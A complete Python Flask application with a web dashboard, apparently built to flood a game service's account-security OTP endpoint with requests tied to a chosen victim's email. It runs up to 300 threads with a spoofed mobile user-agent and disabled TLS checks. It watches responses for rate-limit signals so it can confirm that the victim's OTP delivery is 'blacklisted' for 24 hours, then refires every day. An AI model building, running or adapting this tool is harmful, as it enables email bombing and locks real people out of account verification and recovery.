# lang: Python, file: app.py, target: Windows 11, Python 3.10+
# auto-detects blacklist signal, stops wave, logs confirmed

from flask import Flask, render_template_string, request, jsonify
import requests
import threading
import time
import random
import urllib3
from datetime import datetime, timedelta
urllib3.disable_warnings()

app = Flask(__name__)

ENDPOINT = "https://ffmconnect.ggstudionow.com/game/account_security/swap:send_otp"

HEADERS = {
    "User-Agent":      "GarenaMSDK/4.0.41(TECNO KJ5 ;Android 13;en;HK;app 1.123.1 2019120270;)",
    "Content-Type":    "application/x-www-form-urlencoded",
    "Accept":          "application/json",
    "Accept-Encoding": "gzip",
    "Connection":      "Keep-Alive",
}

REGIONS = ["IND", "MY", "SG", "TH", "ID", "VN", "TW", "BD", "PK"]
LOCALES = ["en_MA", "en_US", "en_IN", "en_SG"]

# blacklist detection — response patterns that mean Gmail suspended OTP delivery
BLACKLIST_SIGNALS = [
    "too many",
    "rate limit",
    "exceeded",
    "blocked",
    "suspended",
    "temporarily",
    "quota",
    "limit reached",
    "try again later",
    "email_blocked",
    "email_limit",
    "send_limit",
]

# how many consecutive rate signals before declaring blacklisted
BLACKLIST_THRESHOLD = 10

_lock       = threading.Lock()
_stop_event = threading.Event()

_state = {
    "running":        False,
    "waiting":        False,
    "blacklisted":    False,
    "email":          "",
    "cycle":          0,
    "sent":           0,
    "success":        0,
    "fail":           0,
    "ratelimit":      0,
    "consec_rl":      0,   # consecutive rate limit hits
    "last_status":    "",
    "next_fire":      None,
    "next_fire_ts":   None,
    "cycle_start":    None,
    "total_sent":     0,
    "total_success":  0,
    "blacklist_time": None,
    "blacklist_log":  [],  # history of blacklist events
}


def is_blacklisted(response_text: str, status_code: int) -> bool:
    if status_code == 429:
        return True
    text_lower = response_text.lower()
    return any(sig in text_lower for sig in BLACKLIST_SIGNALS)


def flood_wave(email, threads, delay_min, delay_max, duration_s, wave_stop_event):
    """flood until duration_s OR blacklist detected"""

    def worker():
        session = requests.Session()
        session.headers.update(HEADERS)
        session.verify = False

        while not wave_stop_event.is_set() and not _stop_event.is_set():
            try:
                payload = {
                    "app_id": "100067",
                    "email":  email,
                    "locale": random.choice(LOCALES),
                    "region": random.choice(REGIONS),
                }
                r = session.post(ENDPOINT, data=payload, timeout=10)

                with _lock:
                    _state["sent"]       += 1
                    _state["total_sent"] += 1

                    if r.status_code == 200 and '"result":0' in r.text:
                        # clean OTP send
                        _state["success"]       += 1
                        _state["total_success"] += 1
                        _state["consec_rl"]      = 0
                        _state["last_status"]    = f"✓ OTP hit #{_state['sent']}"

                    elif is_blacklisted(r.text, r.status_code):
                        # rate limit / blacklist signal
                        _state["ratelimit"] += 1
                        _state["consec_rl"] += 1
                        _state["last_status"] = f"⚠ rate signal #{_state['consec_rl']} — {r.text[:80]}"

                        if _state["consec_rl"] >= BLACKLIST_THRESHOLD:
                            # confirmed blacklisted
                            if not _state["blacklisted"]:
                                _state["blacklisted"]    = True
                                _state["blacklist_time"] = datetime.now().strftime("%H:%M:%S %d/%m")
                                _state["last_status"]    = f"🚫 MAIL BLACKLISTED — {email} — OTP suspended 24h"
                                _state["blacklist_log"].append({
                                    "email": email,
                                    "time":  _state["blacklist_time"],
                                    "cycle": _state["cycle"],
                                    "sent":  _state["sent"],
                                })
                            wave_stop_event.set()
                    else:
                        _state["consec_rl"]   = 0
                        _state["last_status"] = f"#{_state['sent']} {r.status_code} {r.text[:60]}"

            except Exception as e:
                with _lock:
                    _state["fail"] += 1

            time.sleep(random.uniform(delay_min, delay_max))

    workers = [threading.Thread(target=worker, daemon=True) for _ in range(threads)]
    for w in workers:
        w.start()

    deadline = time.time() + duration_s
    while time.time() < deadline and not wave_stop_event.is_set() and not _stop_event.is_set():
        time.sleep(0.5)

    wave_stop_event.set()


def auto_cycle(email, threads, delay, duration):
    with _lock:
        _state["cycle"]         = 0
        _state["total_sent"]    = 0
        _state["total_success"] = 0
        _state["blacklist_log"] = []

    while not _stop_event.is_set():
        with _lock:
            _state["cycle"]      += 1
            _state["sent"]        = 0
            _state["success"]     = 0
            _state["fail"]        = 0
            _state["ratelimit"]   = 0
            _state["consec_rl"]   = 0
            _state["blacklisted"] = False
            _state["running"]     = True
            _state["waiting"]     = False
            _state["next_fire"]   = None
            _state["next_fire_ts"]= None
            _state["cycle_start"] = datetime.now().strftime("%H:%M:%S %d/%m")
            cn = _state["cycle"]

        _state["last_status"] = f"cycle {cn} started"

        wave_stop = threading.Event()
        flood_wave(email, threads, delay * 0.8, delay * 1.2, duration, wave_stop)

        if _stop_event.is_set():
            break

        # check if we stopped due to blacklist or duration
        with _lock:
            bl = _state["blacklisted"]

        if bl:
            _state["last_status"] = f"🚫 BLACKLISTED — waiting 24h before next cycle"
        else:
            _state["last_status"] = f"cycle {cn} wave done — waiting 24h"

        nf = datetime.now() + timedelta(hours=24)
        with _lock:
            _state["waiting"]      = True
            _state["running"]      = False
            _state["next_fire"]    = nf.strftime("%H:%M:%S %d/%m")
            _state["next_fire_ts"] = nf.timestamp()

        deadline = time.time() + 86400
        while time.time() < deadline and not _stop_event.is_set():
            time.sleep(1)

    with _lock:
        _state["running"] = False
        _state["waiting"] = False
        _state["last_status"] = "stopped"


HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>FF Blacklist Tool</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{background:#0a0a0f;color:#e0e0e0;font-family:'Courier New',monospace;min-height:100vh}
        .header{background:linear-gradient(135deg,#1a0a2e,#16213e);border-bottom:2px solid #ff4444;padding:20px 40px}
        .header h1{font-size:24px;color:#ff4444;letter-spacing:3px}
        .header span{font-size:11px;color:#555}
        .container{max-width:980px;margin:40px auto;padding:0 20px}
        .card{background:#111118;border:1px solid #1e1e2a;border-radius:8px;padding:28px;margin-bottom:20px}
        .card h2{color:#ff4444;font-size:11px;letter-spacing:3px;text-transform:uppercase;margin-bottom:20px}
        .input-row{display:flex;gap:12px;flex-wrap:wrap;margin-bottom:14px}
        .inp-wrap{flex:1;min-width:160px}
        label{display:block;font-size:10px;color:#555;letter-spacing:2px;text-transform:uppercase;margin-bottom:6px}
        input{width:100%;background:#0a0a0f;border:1px solid #2a2a3a;border-radius:4px;color:#e0e0e0;padding:10px 14px;font-family:'Courier New',monospace;font-size:13px;outline:none;transition:border .2s}
        input:focus{border-color:#ff4444}
        .btn-row{display:flex;gap:10px;margin-top:18px;flex-wrap:wrap}
        .btn{padding:11px 26px;border:none;border-radius:4px;font-family:'Courier New',monospace;font-size:12px;font-weight:bold;cursor:pointer;letter-spacing:2px;transition:all .2s}
        .btn-start{background:#ff4444;color:#fff}
        .btn-start:hover{background:#ff2222}
        .btn-stop{background:transparent;color:#ff4444;border:1px solid #ff4444}
        .btn-stop:hover{background:#ff444422}

        /* blacklist banner */
        .bl-banner{
            display:none;
            background:#ff444411;
            border:2px solid #ff4444;
            border-radius:8px;
            padding:20px 24px;
            margin-bottom:20px;
            text-align:center;
        }
        .bl-banner.show{display:block}
        .bl-banner .bl-title{font-size:20px;color:#ff4444;letter-spacing:3px;margin-bottom:8px}
        .bl-banner .bl-sub{font-size:12px;color:#888}

        .cycle-bar{background:#0a0a0f;border:1px solid #1e1e2a;border-radius:6px;padding:16px 20px;display:flex;align-items:center;gap:16px;flex-wrap:wrap;margin-bottom:20px}
        .pill{border-radius:20px;padding:4px 14px;font-size:11px;letter-spacing:1px}
        .pill-red   {background:#ff444422;border:1px solid #ff4444;color:#ff4444}
        .pill-orange{background:#ffaa0022;border:1px solid #ffaa00;color:#ffaa00}
        .pill-green {background:#44ff8822;border:1px solid #44ff88;color:#44ff88}
        .countdown{font-size:13px;color:#ffaa00;font-weight:bold}
        .next-label{font-size:11px;color:#555}
        .next-label span{color:#4488ff}

        .stats-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(130px,1fr));gap:12px}
        .stat-box{background:#0a0a0f;border:1px solid #1e1e2a;border-radius:6px;padding:18px;text-align:center}
        .stat-box .val{font-size:26px;font-weight:bold;color:#ff4444}
        .stat-box .lbl{font-size:9px;color:#444;letter-spacing:2px;text-transform:uppercase;margin-top:6px}
        .green .val{color:#44ff88} .yellow .val{color:#ffaa00}
        .blue .val{color:#4488ff}  .purple .val{color:#aa44ff}

        .log-box{background:#0a0a0f;border:1px solid #1e1e2a;border-radius:4px;padding:14px;height:220px;overflow-y:auto;font-size:11px;line-height:1.9}
        .ll{color:#444} .lhit{color:#44ff88} .lfail{color:#ff4444}
        .linf{color:#4488ff} .lwait{color:#ffaa00} .lbl2{color:#ff4444;font-weight:bold}

        .bl-log{margin-top:12px}
        .bl-entry{background:#0a0a0f;border:1px solid #ff444433;border-radius:4px;padding:10px 14px;margin-bottom:8px;font-size:11px;color:#888}
        .bl-entry span{color:#ff4444}

        .dot{width:8px;height:8px;border-radius:50%;background:#333;display:inline-block;margin-right:8px;transition:all .3s}
        .dot.flood{background:#ff4444;box-shadow:0 0 8px #ff4444;animation:pulse 1s infinite}
        .dot.wait{background:#ffaa00;box-shadow:0 0 8px #ffaa00;animation:pulse 2s infinite}
        .dot.bl{background:#ff4444;box-shadow:0 0 16px #ff4444}
        @keyframes pulse{0%,100%{opacity:1}50%{opacity:.3}}
        .status-bar{display:flex;align-items:center;gap:8px;font-size:11px;color:#555;margin-top:14px}
        .status-bar span{color:#888}
    </style>
</head>
<body>
<div class="header">
    <h1>⚡ FF BLACKLIST</h1>
    <span>AUTO DETECT + 24H REFIRE ENGINE</span>
</div>

<div class="container">

    <!-- blacklist confirmed banner -->
    <div class="bl-banner" id="bl-banner">
        <div class="bl-title">🚫 MAIL BLACKLISTED</div>
        <div class="bl-sub" id="bl-sub">OTP delivery suspended — auto refiring in 24h</div>
    </div>

    <div class="card">
        <h2>⚙ Configuration</h2>
        <div class="input-row">
            <div class="inp-wrap" style="flex:3">
                <label>Target Email</label>
                <input type="email" id="email" placeholder="victim@gmail.com">
            </div>
            <div class="inp-wrap">
                <label>Threads</label>
                <input type="number" id="threads" value="50" min="1" max="300">
            </div>
            <div class="inp-wrap">
                <label>Delay (s)</label>
                <input type="number" id="delay" value="0.1" step="0.05" min="0.01">
            </div>
            <div class="inp-wrap">
                <label>Wave Duration (s)</label>
                <input type="number" id="duration" value="300" min="30">
            </div>
        </div>
        <div class="btn-row">
            <button class="btn btn-start" onclick="startFlood()">▶ START AUTO CYCLE</button>
            <button class="btn btn-stop"  onclick="stopFlood()">■ STOP ALL</button>
        </div>
        <div class="status-bar">
            <span class="dot" id="dot"></span>
            <span id="status-text">idle</span>
            &nbsp;|&nbsp; target: <span id="target-disp">—</span>
        </div>
    </div>

    <div class="card" id="cycle-card" style="display:none">
        <h2>🔄 Cycle Status</h2>
        <div class="cycle-bar">
            <div class="pill pill-red" id="cycle-badge">CYCLE 0</div>
            <div id="phase-pill"></div>
            <div class="next-label" id="next-fire-disp"></div>
            <div class="countdown" id="countdown"></div>
        </div>
    </div>

    <div class="card">
        <h2>📊 Live Stats</h2>
        <div class="stats-grid">
            <div class="stat-box">
                <div class="val" id="s-sent">0</div>
                <div class="lbl">This Wave</div>
            </div>
            <div class="stat-box green">
                <div class="val" id="s-success">0</div>
                <div class="lbl">OTPs Hit</div>
            </div>
            <div class="stat-box yellow">
                <div class="val" id="s-rate">0%</div>
                <div class="lbl">Hit Rate</div>
            </div>
            <div class="stat-box blue">
                <div class="val" id="s-rl">0</div>
                <div class="lbl">Rate Signals</div>
            </div>
            <div class="stat-box purple">
                <div class="val" id="s-total">0</div>
                <div class="lbl">Total All Cycles</div>
            </div>
            <div class="stat-box green">
                <div class="val" id="s-total-hit">0</div>
                <div class="lbl">Total OTP Hits</div>
            </div>
        </div>
    </div>

    <div class="card">
        <h2>📟 Live Log</h2>
        <div class="log-box" id="log"></div>
    </div>

    <div class="card" id="bl-history" style="display:none">
        <h2>🚫 Blacklist History</h2>
        <div class="bl-log" id="bl-log"></div>
    </div>

</div>

<script>
let polling  = null;
let cdTimer  = null;
let lastLog  = "";
let blCount  = 0;

function log(msg, cls='ll') {
    if (msg === lastLog) return;
    lastLog = msg;
    const box  = document.getElementById('log');
    const line = document.createElement('div');
    line.className = cls;
    line.textContent = '[' + new Date().toLocaleTimeString() + '] ' + msg;
    box.appendChild(line);
    if (box.children.length > 300) box.removeChild(box.firstChild);
    box.scrollTop = box.scrollHeight;
}

async function startFlood() {
    const email    = document.getElementById('email').value.trim();
    const threads  = parseInt(document.getElementById('threads').value);
    const delay    = parseFloat(document.getElementById('delay').value);
    const duration = parseInt(document.getElementById('duration').value);
    if (!email) { log('enter target email','lfail'); return; }

    // reset banner
    document.getElementById('bl-banner').classList.remove('show');

    const res  = await fetch('/start',{
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body:JSON.stringify({email,threads,delay,duration})
    });
    const data = await res.json();
    if (data.ok) {
        log('auto cycle started → '+email,'linf');
        document.getElementById('target-disp').textContent = email;
        document.getElementById('cycle-card').style.display = 'block';
        startPolling();
    } else {
        log('error: '+data.error,'lfail');
    }
}

async function stopFlood() {
    const res  = await fetch('/stop',{method:'POST'});
    const data = await res.json();
    log('stopped — total sent: '+data.total_sent,'linf');
    document.getElementById('dot').className = 'dot';
    document.getElementById('status-text').textContent = 'idle';
    stopPolling();
}

function startPolling() {
    polling = setInterval(async () => {
        const res = await fetch('/stats');
        const s   = await res.json();

        document.getElementById('s-sent').textContent      = s.sent;
        document.getElementById('s-success').textContent   = s.success;
        document.getElementById('s-rl').textContent        = s.ratelimit;
        document.getElementById('s-total').textContent     = s.total_sent;
        document.getElementById('s-total-hit').textContent = s.total_success;
        const rate = s.sent > 0 ? ((s.success/s.sent)*100).toFixed(1)+'%' : '0%';
        document.getElementById('s-rate').textContent = rate;
        document.getElementById('cycle-badge').textContent = 'CYCLE '+s.cycle;

        const dot  = document.getElementById('dot');
        const stxt = document.getElementById('status-text');
        const pp   = document.getElementById('phase-pill');
        const nfd  = document.getElementById('next-fire-disp');
        const ban  = document.getElementById('bl-banner');

        // blacklist banner
        if (s.blacklisted) {
            ban.classList.add('show');
            dot.className = 'dot bl';
            stxt.textContent = 'BLACKLISTED';
            document.getElementById('bl-sub').textContent =
                s.email + ' — OTP suspended — refiring at ' + (s.next_fire || '...');
        } else if (s.running) {
            ban.classList.remove('show');
            dot.className = 'dot flood';
            stxt.textContent = 'flooding';
            pp.innerHTML = '<span class="pill pill-red">⚡ FLOODING</span>';
            nfd.textContent = '';
            clearCd();
        } else if (s.waiting) {
            dot.className = 'dot wait';
            stxt.textContent = 'waiting 24h';
            pp.innerHTML = '<span class="pill pill-orange">⏳ WAITING 24H</span>';
            if (s.next_fire) {
                nfd.innerHTML = 'next fire: <span>'+s.next_fire+'</span>';
                startCd(s.next_fire_ts);
            }
        } else {
            dot.className = 'dot';
            stxt.textContent = 'idle';
            pp.innerHTML = '';
        }

        // blacklist history
        if (s.blacklist_log && s.blacklist_log.length > blCount) {
            blCount = s.blacklist_log.length;
            const hist = document.getElementById('bl-history');
            const blog = document.getElementById('bl-log');
            hist.style.display = 'block';
            blog.innerHTML = '';
            s.blacklist_log.forEach(e => {
                const d = document.createElement('div');
                d.className = 'bl-entry';
                d.innerHTML = `<span>🚫 BLACKLISTED</span> — ${e.email} — cycle ${e.cycle} — ${e.time} — ${e.sent} requests sent`;
                blog.appendChild(d);
            });
        }

        if (s.last_status) {
            const cls = s.last_status.includes('✓')        ? 'lhit'
                      : s.last_status.includes('BLACKLIST') ? 'lbl2'
                      : s.last_status.includes('⚠')        ? 'lfail'
                      : s.last_status.includes('wait')      ? 'lwait'
                      : 'll';
            log(s.last_status, cls);
        }
    }, 800);
}

function startCd(ts) {
    clearCd();
    if (!ts) return;
    cdTimer = setInterval(() => {
        const diff = ts*1000 - Date.now();
        if (diff <= 0) {
            document.getElementById('countdown').textContent = 'firing now...';
            clearCd(); return;
        }
        const h = Math.floor(diff/3600000);
        const m = Math.floor((diff%3600000)/60000);
        const sc= Math.floor((diff%60000)/1000);
        document.getElementById('countdown').textContent =
            `${String(h).padStart(2,'0')}:${String(m).padStart(2,'0')}:${String(sc).padStart(2,'0')} until next wave`;
    },1000);
}

function clearCd() {
    if (cdTimer){clearInterval(cdTimer);cdTimer=null;}
    document.getElementById('countdown').textContent='';
}

function stopPolling() {
    if (polling){clearInterval(polling);polling=null;}
    clearCd();
}
</script>
</body>
</html>
"""


@app.route("/")
def index():
    return render_template_string(HTML)


@app.route("/start", methods=["POST"])
def start():
    global _stop_event
    data     = request.get_json()
    email    = data.get("email","")
    threads  = int(data.get("threads", 50))
    delay    = float(data.get("delay", 0.1))
    duration = int(data.get("duration", 300))

    if not email:
        return jsonify({"ok": False, "error": "no email"})

    _stop_event.set()
    time.sleep(0.3)
    _stop_event = threading.Event()

    _state["email"] = email
    threading.Thread(
        target=auto_cycle,
        args=(email, threads, delay, duration),
        daemon=True
    ).start()
    return jsonify({"ok": True})


@app.route("/stop", methods=["POST"])
def stop():
    _stop_event.set()
    return jsonify({"ok": True, "total_sent": _state["total_sent"]})


@app.route("/stats")
def stats():
    with _lock:
        return jsonify({
            "running":        _state["running"],
            "waiting":        _state["waiting"],
            "blacklisted":    _state["blacklisted"],
            "email":          _state["email"],
            "cycle":          _state["cycle"],
            "sent":           _state["sent"],
            "success":        _state["success"],
            "fail":           _state["fail"],
            "ratelimit":      _state["ratelimit"],
            "last_status":    _state["last_status"],
            "next_fire":      _state["next_fire"],
            "next_fire_ts":   _state["next_fire_ts"],
            "total_sent":     _state["total_sent"],
            "total_success":  _state["total_success"],
            "blacklist_log":  _state["blacklist_log"],
        })


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=False)